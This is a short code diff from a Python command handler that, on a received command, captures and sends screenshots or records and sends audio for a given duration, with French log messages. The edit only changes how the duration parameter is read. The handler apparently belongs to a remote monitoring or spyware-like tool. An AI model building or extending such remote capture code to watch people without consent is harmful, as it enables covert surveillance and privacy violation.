@@ -46,7 +46,8 @@ def command(data):
         take_and_send_screenshot()
     elif command == 'audio':
         log_event("Commande d'enregistrement audio reçue")
-        duration = int(data.get('duration', 10))
+        params = data.get('params', {})
+        duration = int(params.get('duration', 10))
         record_and_send_audio(duration)
     else:
         log_event(f"Commande non reconnue: {command}")
